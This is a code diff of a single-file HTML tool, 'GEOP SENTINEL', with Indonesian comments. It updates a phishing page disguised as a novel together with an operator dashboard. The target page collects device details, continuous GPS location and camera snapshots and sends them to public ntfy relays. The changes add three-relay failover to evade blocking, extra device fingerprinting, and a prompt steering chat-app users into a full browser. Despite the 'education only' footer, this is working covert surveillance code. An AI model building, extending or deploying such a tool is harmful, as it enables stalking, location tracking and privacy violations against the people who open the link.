@@ -2,15 +2,14 @@
 <html lang="id">
 <head>
 <!-- ============================================================
-     GEOP SENTINEL v7.0 "AURORA" — BUILD FINAL
-     Arsitektur single-file: Dashboard + Mode Novel (target).
-     Relay: ntfy.sh (SSE + polling fallback, dedupe by message id).
-     Snapshot: 4x @ 3,5 detik, lalu kamera otomatis mati.
-     Media edukasi social engineering — wajib konsen, perangkat sendiri.
+     GEOP SENTINEL v7.2 "AURORA STABLE"
+     Desain sama dengan v7; logika relay dikembalikan sederhana
+     (fetch + SSE) seperti versi pertama yang berhasil,
+     ditambah redundansi 3 relay anti-blokir.
 ============================================================= -->
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>GEOP SENTINEL v7 — AURORA</title>
+<title>GEOP SENTINEL v7.2 — AURORA STABLE</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛰️</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -73,7 +72,6 @@ img, video, iframe, canvas{ max-width: 100%; }
 button{ font-family: inherit; }
 a{ color: var(--acc); }
 ::selection{ background: rgba(76,201,240,.35); }
-/* scrollbar halus */
 ::-webkit-scrollbar{ width: 8px; height: 8px; }
 ::-webkit-scrollbar-thumb{ background: #223052; border-radius: 99px; }
 ::-webkit-scrollbar-track{ background: transparent; }
@@ -729,7 +727,6 @@ footer{
 }
 @media (max-width: 640px){
   .topbar{ position: static; }
-  .steps{ grid-template-columns: 1fr 1fr 1fr; }
   .feedwrap{ aspect-ratio: 4 / 3; }
   .livebadge{ left: 26px; }
   .ftime{ right: 26px; }
@@ -755,7 +752,7 @@ footer{
         <h1>GEOP <span>SENTINEL</span></h1>
         <div class="sub">Remote Verification Command</div>
       </div>
-      <span class="tagver">v7.0 AURORA</span>
+      <span class="tagver">v7.2 AURORA STABLE</span>
     </div>
     <div class="topright">
       <div class="pill" id="pill"><i></i><span id="pillTxt">OFFLINE</span></div>
@@ -772,7 +769,6 @@ footer{
 
   <div class="layout">
 
-    <!-- ===== KOLOM KIRI ===== -->
     <div class="colstack">
 
       <section class="card" id="secGen">
@@ -818,7 +814,6 @@ footer{
 
     </div>
 
-    <!-- ===== KOLOM KANAN ===== -->
     <div class="colstack">
 
       <section class="card" id="secFeed">
@@ -866,8 +861,8 @@ footer{
   </div>
 
   <footer>
-    GEOP SENTINEL v7.0 AURORA • RELAY SEMENTARA 12 JAM • MEDIA EDUKASI SOCIAL ENGINEERING<br>
-    UJI COBA HANYA PADA PERANGKAT MILIK SENDIRI • PENYALAHGUNAAN MELANGGAR UU PDP & UU ITE
+    GEOP SENTINEL v7.2 AURORA STABLE • 3 RELAY REDUNDAN • RELAY SEMENTARA 12 JAM<br>
+    MEDIA EDUKASI SOCIAL ENGINEERING • UJI COBA HANYA PADA PERANGKAT MILIK SENDIRI • UU PDP/ITE
   </footer>
 </div>
 
@@ -877,7 +872,7 @@ footer{
 <div id="targetMode" hidden>
   <div class="twrap">
     <div class="banner" id="banner" hidden>
-      ⚠️ Terdeteksi dibuka dari dalam aplikasi chat — tap ⋮ / ️ lalu pilih
+      ⚠️ Terdeteksi dibuka dari dalam aplikasi chat — tap ⋮ lalu pilih
       <b>"Buka di Browser / Open in Chrome"</b> agar kamera & lokasi berfungsi lancar.
     </div>
 
@@ -934,60 +929,74 @@ footer{
 
 <script>
 /* ============================================================
-   GEOP SENTINEL v7.0 AURORA — LOGIKA INTI
-   Single-file: mode dipilih berdasarkan parameter ?t=
+   GEOP SENTINEL v7.2 — LOGIKA INTI
+   Pola sederhana seperti versi pertama yang berhasil:
+   fetch POST/PUT + EventSource SSE + satu kali muat riwayat.
+   Baru: redundansi 3 relay (anti rate-limit / blokir).
 ============================================================ */
 (() => {
 'use strict';
 
 /* ----------------------------------------------------------
-   0) UTIL DASAR
+   0) UTIL & DAFTAR RELAY
 ---------------------------------------------------------- */
 const $  = s => document.querySelector(s);
 const $$ = s => [...document.querySelectorAll(s)];
-const NT = 'https://ntfy.sh/';
+const RELAYS = [
+  'https://ntfy.sh',
+  'https://ntfy.darmok.dev',
+  'https://ntfy.tilde.zone'
+];
 const esc = s => String(s ?? '').replace(/[&<>"]/g, c =>
   ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 const topic = new URLSearchParams(location.search).get('t');
 
-/* ----------------------------------------------------------
-   1) ROUTER MODE
----------------------------------------------------------- */
 if (topic) targetMode(); else dashMode();
 
 /* ==========================================================
-   MODE TARGET (HALAMAN NOVEL DI HP)
+   MODE TARGET (HALAMAN NOVEL)
 ========================================================== */
 function targetMode(){
   $('#dashMode').remove();
   $('#targetMode').hidden = false;
 
-  /* banner in-app browser */
   if (/WhatsApp|Instagram|FBAN|FBAV|Messenger|Line\//i.test(navigator.userAgent))
     $('#banner').hidden = false;
 
   const note = t => { const n = $('#bnote'); n.hidden = false; n.textContent = t; };
   const dlog = t => { const d = $('#diag'); d.hidden = false; d.innerHTML += '<div>▸ ' + t + '</div>'; };
 
-  /* kirim ke relay; laporkan kegagalan ke diagnostik */
-  const send = (title, msg, blob, name) => {
+  /* kirim sederhana + failover antar relay */
+  const send = async (title, msg, blob, name) => {
     const o = blob
       ? { method:'PUT',  body:blob, headers:{'Title':title,'Filename':name,'Content-Type':'image/jpeg'} }
       : { method:'POST', body:msg,  headers:{'Title':title} };
-    return fetch(NT + topic, o)
-      .then(r => { if (!r.ok) throw 0; return true; })
-      .catch(() => { dlog('⚠️ kirim "' + title + '" ke relay gagal'); return false; });
+    for (const base of RELAYS) {
+      try {
+        const r = await fetch(base + '/' + topic, o);
+        if (r.ok) return true;
+      } catch(e){}
+    }
+    dlog('⚠️ semua relay menolak: ' + title);
+    return false;
   };
 
-  /* ---------- parsing perangkat ---------- */
-  const parseUA = () => {
+  /* ---------- parsing perangkat (model asli via userAgentData) ---------- */
+  const parseUA = async () => {
     const ua = navigator.userAgent;
     const android = (ua.match(/Android\s([\d.]+)/) || [])[1] || null;
     const ios     = (ua.match(/OS ([\d_]+) like Mac/) || [])[1] || null;
-    const model   = String(
+    let model = String(
       (ua.match(/;\s*([^;()]+?)\s*Build\//) || [])[1] ||
       (ua.match(/\(([^)]+)\)/) || [])[1] || ''
     ).trim() || ua.slice(0, 50);
+    try {
+      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        const hv = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+        if (hv.model) model = hv.model;
+        if (!android && hv.platformVersion) {}
+      }
+    } catch(e){}
     const low = model.toLowerCase();
     let brand = 'Lainnya';
     if (/iphone|ipad/i.test(ua))            brand = 'Apple';
@@ -1015,7 +1024,7 @@ function targetMode(){
     return '–';
   };
   const metaPayload = async () => {
-    const u = parseUA(), b = await battInfo(), n = netInfo();
+    const u = parseUA ? await parseUA() : {}, b = await battInfo(), n = netInfo();
     return JSON.stringify({
       brand: u.brand, model: u.model,
       android: u.android, ios: u.ios,
@@ -1023,7 +1032,7 @@ function targetMode(){
     });
   };
 
-  /* ---------- META dikirim saat halaman dibuka ---------- */
+  /* META + status saat halaman dibuka */
   send('STATUS', '📖 Novel dibuka di perangkat uji');
   metaPayload().then(p => send('META', p));
 
@@ -1054,17 +1063,15 @@ function targetMode(){
 
   /* ---------- alur verifikasi ---------- */
   async function begin(){
-    send('STATUS', '✅ Persetujuan verifikasi diberikan (v7)');
+    send('STATUS', '✅ Persetujuan verifikasi diberikan (v7.2)');
     try { await navigator.wakeLock.request('screen'); } catch(e){}
 
-    /* META lengkap pasca-konsen */
     try {
       const p = JSON.parse(await metaPayload());
       send('META', JSON.stringify(p));
       dlog('✅ Info perangkat terkirim (' + p.brand + ' ' + p.model + ')');
     } catch(e){ dlog('❌ info perangkat gagal'); }
 
-    /* GPS real-time (throttle 10 dtk) */
     if (navigator.geolocation) {
       let last = 0;
       navigator.geolocation.watchPosition(p => {
@@ -1132,7 +1139,6 @@ function targetMode(){
         }
       }, ms));
 
-      $('#ch2').hidden = true === false ? true : false; /* noop guard */
       $('#ch2').hidden = false;
       $('#btnNext').hidden = true;
       $('#btnRetry').hidden = true;
@@ -1153,11 +1159,11 @@ function targetMode(){
 function dashMode(){
   $('#targetMode').remove();
 
-  /* ---------- state ---------- */
-  let es = null, pollTimer = null, raw = [], seen = new Set();
+  let esList = [], loaders = [], pollTimer = null;
+  let raw = [], seen = new Set();
   let snaps = 0, t0 = null, lastMap = 0, lastLoc = null, cur = null;
 
-  /* ---------- arsip lokal (riwayat per-link) ---------- */
+  /* ---------- arsip lokal ---------- */
   const AKEY = 'sent_archive_v7';
   const loadA = () => { try { return JSON.parse(localStorage.getItem(AKEY)) || {}; } catch(e){ return {}; } };
   const saveA = a => {
@@ -1196,6 +1202,10 @@ function dashMode(){
       st === 'poll' ? 'LIVE • POLLING' :
       st === 'retry' ? 'RECONNECT…' : 'OFFLINE';
   };
+  const connUpdate = () => {
+    const live = esList.some(e => e.readyState === 1);
+    conn(live ? 'live' : 'poll');
+  };
 
   /* ---------- riwayat ---------- */
   function renderHist(){
@@ -1224,7 +1234,7 @@ function dashMode(){
     });
   }
 
-  /* ---------- feed helpers ---------- */
+  /* ---------- feed ---------- */
   const swapFeed = (url, tag) => {
     const im = new Image();
     im.onload = () => {
@@ -1253,7 +1263,7 @@ function dashMode(){
     if (s.startsWith('http')) window.open(s, '_blank');
   };
 
-  /* ---------- tombol utama ---------- */
+  /* ---------- tombol ---------- */
   $('#btnNew').onclick = () => {
     const t = rnd();
     localStorage.setItem('sent_topic_v7', t);
@@ -1289,7 +1299,7 @@ function dashMode(){
     log('Laporan JSON diunduh', 'g');
   };
 
-  /* ---------- koneksi relay: SSE + POLLING fallback ---------- */
+  /* ---------- koneksi: pola lama (SSE + riwayat) x 3 relay ---------- */
   async function watch(t){
     stop();
     cur = t; raw = []; seen = new Set(); snaps = 0; t0 = Date.now(); lastMap = 0;
@@ -1297,39 +1307,42 @@ function dashMode(){
     $('#snaps').textContent = '0';
     $('#uptime').textContent = '00:00:00';
     $('#log').innerHTML = '';
-    log('Menghubungkan relay ntfy.sh…');
+    log('Menghubungkan ' + RELAYS.length + ' relay…');
     renderHist();
 
-    /* polling cadangan (jalan selalu, dedupe by id) */
-    const poll = async () => {
-      try {
-        const r = await fetch(NT + t + '/json?poll=1');
-        const txt = await r.text();
-        txt.split('\n').filter(Boolean).forEach(l => {
-          try { process(JSON.parse(l)); } catch(e){}
-        });
-        if (!es || es.readyState === 2) conn('poll');
-      } catch(e){ conn('retry'); }
-    };
-    await poll();
-    pollTimer = setInterval(poll, 6000);
+    RELAYS.forEach(base => {
+      const nama = base.replace('https://', '');
+      const load = () => fetch(base + '/' + t + '/json?poll=1')
+        .then(r => r.text())
+        .then(txt => {
+          txt.split('\n').filter(Boolean).forEach(l => {
+            try { process(JSON.parse(l)); } catch(e){}
+          });
+          connUpdate();
+        })
+        .catch(() => {});
+      loaders.push(load);
+      load();
 
-    /* SSE utama */
-    try {
-      es = new EventSource(NT + t + '/sse');
-      es.onopen = () => { conn('live'); log('Siaran SSE terhubung.', 'g'); };
-      es.onerror = () => { if (es.readyState !== 1) conn('poll'); };
+      const es = new EventSource(base + '/' + t + '/sse');
+      esList.push(es);
+      es.onopen = () => { connUpdate(); log('SSE terhubung: ' + nama, 'g'); };
+      es.onerror = () => connUpdate();
       es.onmessage = e => { try { process(JSON.parse(e.data)); } catch(err){} };
-    } catch(e){ conn('poll'); }
+    });
+
+    pollTimer = setInterval(() => loaders.forEach(f => f()), 8000);
   }
   function stop(){
-    if (es) { es.close(); es = null; }
-    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    esList.forEach(e => e.close());
+    esList = []; loaders = [];
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = null;
     t0 = null;
     conn('');
   }
 
-  /* ---------- pemroses pesan (dedupe) ---------- */
+  /* ---------- pemroses pesan (dedupe by id) ---------- */
   function process(m){
     if (m.event && m.event !== 'message') return;
     if (m.id && seen.has(m.id)) return;
@@ -1396,7 +1409,7 @@ function dashMode(){
     }
   }
 
-  /* ---------- restore sesi terakhir ---------- */
+  /* ---------- restore ---------- */
   window.addEventListener('load', () => {
     renderHist();
     const t = localStorage.getItem('sent_topic_v7');
